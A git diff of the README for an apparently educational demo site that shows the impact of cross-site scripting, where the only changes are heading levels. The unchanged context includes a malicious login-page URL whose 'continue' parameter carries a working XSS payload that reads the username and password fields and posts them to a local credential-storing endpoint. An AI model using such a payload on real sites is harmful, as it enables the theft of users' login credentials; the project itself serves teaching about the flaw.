@@ -18,7 +18,7 @@ To get started, navigate to No Man's Land Revenue Agency home page: [https://mts
     3. Run ```node server.js``` (you may need to run first ```npm install express mysql cors``` in the ```backend``` directory)
     4. Navigate to the [malicious login page URL](https://mtsanovv.github.io/nomanslandra/frontend/login.html?continue=$.ajax({contentType:%27application/json%27,type:%27POST%27,url:%27http://localhost:3000/storeCredentials%27,data:JSON.stringify({username:$(%27input:eq(0)%27).val(),password:$(%22input:eq(1)%22).val()})});$(%22article%22).first().append(%27%3Cimg%20src=%22https://media.tenor.com/7XnVtgeQv4EAAAAC/money-pool-rich.gif%22/%3E%3Ciframe%20width=%221%22%20height=%221%22%20src=%22https://www.youtube.com/embed/_w7Ft_JTbH4?autoplay=1%22%3E%3C/iframe%3E%27);console.log)
 
-# Notes
+## Notes
 - Created for educational purposes only and to demonstrate how bad XSS vulnerabilities can be
 - Recommended browser engine: Chromium (Chrome). Gecko (Firefox) might also work but it has not been tested and WebKit (Safari) is not recommended due to odd behavior
 - This is the unencoded JavaScript code for the 'continue' parameter in the malicious URL:
@@ -26,7 +26,7 @@ To get started, navigate to No Man's Land Revenue Agency home page: [https://mts
 - The website is based on Telephasic by HTML5UP!
 - Inspired by: [https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html](https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html)
 
-# License
+## License
 Creative Commons Attribution 3.0 Unported
 [http://creativecommons.org/licenses/by/3.0/](http://creativecommons.org/licenses/by/3.0/)
 
